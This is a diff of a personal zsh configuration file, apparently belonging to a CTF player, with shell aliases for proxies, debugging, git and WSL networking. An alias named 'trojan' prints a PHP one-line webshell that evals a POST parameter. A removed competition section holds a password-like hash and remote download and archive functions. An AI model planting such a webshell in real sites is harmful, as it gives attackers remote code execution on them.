@@ -10,63 +10,41 @@ alias proxyon="export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.
 alias pchain="proxychains4"
 alias google="curl google.com"
 alias baidu="curl baidu.com"
-alias pmod="sudo chmod a+x *" # power mod
+alias ipip='echo "public IP addr: $(curl -s http://myip.ipip.net)"'
+function ipof(){
+  ping $1 -c 1 | sed -n "1p" | cut -d '(' -f2|cut -d ')' -f1;
+}
+# apps
+alias nebula="sudo ~/apps/nebula/nebula -config /etc/nebula/config.yaml"
+alias nebula_restart="sudo kill -9 $(pgrep nebula); sudo ~/apps/nebula/nebula -config /etc/nebula/config.yaml"
+# pwn
 alias ida-server-x86="cd ~/pwn/.server && ./linux_server"
 alias ida-server-x64="cd ~/pwn/.server && ./linux_server64"
 alias pwn="code ~/pwn"
+# ctf-web
+alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.0.0'
+alias trojan="echo '<?php @eval(\$_POST['attack']);?>'"
+# shortcuts
+alias pmod="sudo chmod a+x *" # power mod
 alias ggg="gaa && gcmsg '..' && gp"
 alias gitback="git reset . && git checkout . && git clean -df" # git back (to origin)
 alias cae="conda activate"
 alias cde="conda deactivate"
 alias sizeof="du -sh"
 alias t="tmux"
-alias ipip='echo "public IP addr: $(curl -s http://myip.ipip.net)"'
 alias ...="cd ../.."
 alias k9="kill -9"
 alias ka="killall"
 alias hhh="hexo clean && hexo g && hexo s"
+alias history_fix="mv ~/.zsh_history ~/.zsh_history_bad && strings ~/.zsh_history_bad > ~/.zsh_history && fc -R ~/.zsh_history"
 function code--(){
   code --remote ssh-remote+$1 $2 
 }
-# hacker
-alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.0.0'
-alias trojan="echo '<?php @eval(\$_POST['attack']);?>'"
-# awd
-server="ybw@love4cry.cn"
-port=22222
-alias pass="echo '0e9521b8817afabe993efe5e42b53156' | copy && echo pass_copied."
-function push-keysh(){
-  curl -fsSL love4cry.cn/key.sh -o key.sh
-  scp -P $port key.sh $server:~/key.sh
-  rm key.sh
-}
-function push-file(){
-  echo "from [$1] to server:[$2]"
-  if [ -d $1 ]; then scp -P $port -r $1 $server:$2;
-    else scp -P $port $1 $server:$2;
-  fi
-}
-function dump-file(){
-  echo "from server:[$1] to [$2]"
-  if [ -d $2 ]; then scp -P $port -r $server:$1 $2;
-    else scp -P $port $server:$1 $2;
-  fi
-}
-function dump-server(){
-  echo "ssh remote command..."
-  ssh -p $port $server "tar -Pczvf ~/dumped.tgz /var/www/html"
-  echo "downloading..."
-  scp -P $port $server:~/dumped.tgz .
-}
-# awd over
 function ssl_cert_install(){
   acme.sh --install-cert -d $1 \
   --cert-file      $2/cert.pem  \
   --key-file       $2/key.pem  \
   --fullchain-file $2/fullchain.pem \
-}
-function ipof(){
-  ping $1 -c 1 | sed -n "1p" | cut -d '(' -f2|cut -d ')' -f1;
 }
 function killport(){
   kill -9 $(lsof -i:$1 | sed -n "2p" | cut -d " " -f 2)
@@ -123,7 +101,6 @@ if [[ $UNAME =~ "Darwin" ]]; then
     scp -P 22222 $new_file ybw@cpu:~/pwn/.target
     # scp -P 22222 $1 ybw@cpu:/mnt/c/Users/27564/Desktop/pwnfiles
   } 
-  alias wsl-update="ssh -p 22222 ybw@cpu pwn/tools/update.sh"
   cpu_host_update
 elif [[ $UNAME =~ "WSL2" ]]; then
   __conda="$HOME/.miniconda"
@@ -138,45 +115,46 @@ elif [[ $UNAME =~ "WSL2" ]]; then
   alias sm_restart="taskkill.exe /IM  Share\* && sm"
   alias ida-x64="/mnt/c/pwntools/ida75/75ida64.exe -i"
   alias ida-x86="/mnt/c/pwntools/ida75/75ida.exe -i"
-  win_ip=$(ipconfig.exe | grep -a 192.168 | sed "/\.1.$/d"| cut -d ":" -f 2|sed "s/[[:space:]]//g")
-  # for line in $win_ip
-  # do
-  #   if [ $(echo $line | grep 192.168.100 ) ]; then p2p_ip=$line;echo "p2p";
-  #   else res=$line; echo "else";
-  #   fi
-  # done
-  # win_ip=$res
+
+  win_ip_lan=$(ipconfig.exe | grep -a 192.168 | sed "/\.1.$/d"| cut -d ":" -f 2|sed "s/[[:space:]]//g")
+  win_ip=$(ip route show | sed -n "1p" | awk -F" " '{print $3}') # 对应win的wsl虚拟网卡的ip
   function pfdwin2wsl(){
-    # port forward to windows
     netsh.exe interface portproxy reset > /dev/null
     netsh.exe interface portproxy add v4tov4 listenaddress=$1 listenport=22222 connectaddress=wsl.local connectport=22 > /dev/null
     netsh.exe interface portproxy add v4tov4 listenaddress=$1 listenport=23946 connectaddress=wsl.local connectport=23946 > /dev/null
   }
-  # pfdwsl2win 
-  # iptables -t nat -A PREROUTING -p tcp -m tcp --dport 3389 -j DNAT --to-destination $win_ip:3389
+  function pfdwsl2win(){
+    sudo echo 1 >/proc/sys/net/ipv4/ip_forward
+    sudo iptables -t nat -A POSTROUTING -j MASQUERADE
+    sudo iptables -t nat -A PREROUTING -p tcp -m tcp --dport 3389 -j DNAT --to-destination $win_ip:3389
+  }
+
   function wsl_hosts(){
-    # 把wsl的ip添加到windows的host里面
+    ### wsl每次启动时的ip和win上面的虚拟网卡都不一样
+    
+    # 把wsl的ip添加到windows的host里面->让ida能够轻松的debug
     hosts="/mnt/c/Windows/System32/drivers/etc/hosts"
     ip=$(ip add | grep inet | grep eth0 | awk -F" " '{print $2}' | cut -d"/" -f 1)
     echo -n "wsl ip: $ip | "
     aoc "wsl.local" "$ip wsl.local" "$hosts"
-    # 把win的ip加入到wsl的host里面，如果局域网ip变了就重新进行端口转发
-    hosts="/etc/hosts"
-    echo -n "win ip: $1 | "
-    win_ip_not_change=$(cat $hosts | grep "$1 win.local")
-    if [ $win_ip_not_change ]; then 
-      echo "not changed."
-    else
-      echo "Forwarding..."
-      aoc "win.local" "$1 win.local" "$hosts"
-      pfdwin2wsl $1
-    fi
+
+    # 把win的ip加入到wsl的host里面，如果局域网ip变了就重新进行端口转发，端口转发是为了通过win访问wsl
+    # hosts="/etc/hosts"
+    # echo -n "win ip: $1 | "
+    # win_ip_not_change=$(cat $hosts | grep "$1 win.local")
+    # if [ $win_ip_not_change ]; then 
+    #   echo "not changed."
+    # else
+    #   echo "Forwarding..."
+    #   aoc "win.local" "$1 win.local" "$hosts"
+    #   pfdwin2wsl $1
+    # fi
   }
   function load(){
     if [[ $(service $1 status | grep not) ]];then sudo service $1 start;echo "$1 just started";else echo "$1 is already running";fi
   }
 
-  # wsl_hosts $win_ip
+  # wsl_hosts $win_ip_lan
   load ssh
   ~/apps/npc/npc.sh # start npc service if it's not running
   ~/apps/nebula/nebula.sh # start nebula service if it's not running
